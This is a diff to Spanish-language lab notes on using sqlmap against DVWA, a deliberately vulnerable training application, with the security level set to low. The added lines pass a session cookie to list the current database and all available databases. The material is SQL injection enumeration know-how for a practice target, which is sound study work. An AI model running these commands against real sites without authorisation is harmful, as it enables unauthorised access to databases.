@@ -48,6 +48,9 @@
 --- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner
 --- Enter
 --- Se mostrará la información relacionada a la base de datos
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner --current-db ---> (Nos muestra la base de datos actual: dvwa)
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --banner --current-db --dbs ---> (Nos muestra todas las bases de datos disponibles)
+
 
 
 
